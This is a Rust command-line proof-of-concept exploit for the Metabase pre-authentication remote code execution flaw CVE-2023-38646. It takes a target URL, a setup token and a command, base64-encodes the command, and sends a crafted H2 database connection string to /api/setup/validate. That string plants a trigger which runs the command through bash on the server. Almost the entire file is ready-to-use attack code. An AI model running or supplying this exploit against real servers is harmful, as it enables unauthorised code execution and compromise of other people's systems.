/* Required Crates */
use reqwest; // Handling HTTP Requests
use clap::{arg, command}; // CLI Argument parsing 
use serde_json::json; // Json Formatting and for json! macro
use base64::{Engine as _, engine::general_purpose}; // Base64 Encoding, vanilla base64.encode() is deprecated
use colored::Colorize; // Just terminal colors

/* Encoding command to base64, this contains another handling for padding (=) */
fn b64_encode(cmd: &str) -> String {
    let encoded = general_purpose::STANDARD.encode(cmd); // Encode the original command
    let eq_count = encoded.chars().filter(|&c| c == '=').count(); // Check the number of '=' in the encoded string
    
    // Adjust the padding based on the number of equal signs
    if eq_count >= 1 {
        let adjusted_payload = general_purpose::STANDARD.encode(format!("{}{}", cmd, " ".repeat(eq_count)));
        return adjusted_payload;
    }

    encoded
}

#[tokio::main]
async fn main() -> Result<(), reqwest::Error>{
    /* CLI Application Handling */

    // Arguments
    let args = command!() 
        .arg(arg!( // Args for URL
            -u --url <String> "Target URL, i.e. http://somewebsite.com"
        ).required(true))
        .arg(arg!( // Args for token
            -t --token <String> "Target token found in /api/session/properties"
        ).required(true))
        .arg(arg!( // Args for command
            -c --cmd <String> "Command to be executed at the target shell"
        ))
        .get_matches(); // Takes all the matching params and returns it to the args vector
    
    // Setting arguments as an external variable from args
    let mut url = "Null"; // Setting url from args
    if let Some(url_arg) = args.get_one::<String>("url") {
        url = &url_arg;
    }

    let mut token = "Null"; // Setting token from args
    if let Some(token_arg) = args.get_one::<String>("token") {
        token = &token_arg;    
    }

    let mut cmd = "Null"; // Setting command from args
    if let Some(cmd_arg) = args.get_one::<String>("cmd") {
        cmd = &cmd_arg;
    }

    // Printing intro
    std::process::Command::new("clear").status().unwrap();
    println!("{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}\n",
            "┌──────────────────────────────────────────────┐".bold(),
            "│  Metabase Pre-Auth RCE (CVE-2023-38646) POC  │".bold(),
            "│             by Shisones Markov               │".bold(),
            "└──────────────────────────────────────────────┘".bold(),
            " ├>This script is a proof-of-concept of a RCE vulnerability\n │ regarding the Metabase Software that allows\n │ remote code execution on the target server.",
            " └>The vulnerable version preceeds the following patches:",
            "   - Metabase Open-Source Edition 0.46.6.1",
            "   - Metabase Enterprise Edition 1.46.6.1"
        );

    /* Preparing the payloads */ 
    println!("{}", "[i] Initializing script".yellow());
    
    // Encoding command, building payload and creating POST client
    let cmd = b64_encode(cmd);
    let url = format!("{}/api/setup/validate", url).to_string();
    let client = reqwest::Client::new();
    let payload = json!({
        "token": token,
        "details": {
            "details": {
                "db": format!("zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER pwnd BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{cmd}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"),
                "advanced-options": false,
                "ssl": true
            },
            "name": "x",
            "engine": "h2"
        }
    });
    
    // Sending payload to target
    println!("{} {}", "[i] Sending Payload to".yellow(), url.clone().yellow());
    let _response = client
        .post(url.clone())
        .header(reqwest::header::USER_AGENT, "usr_agent")
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .body(payload.to_string())
        .send()
        .await;
    
    println!("{}", "[o] Payload sent, please check the result".green());

    Ok(())
}
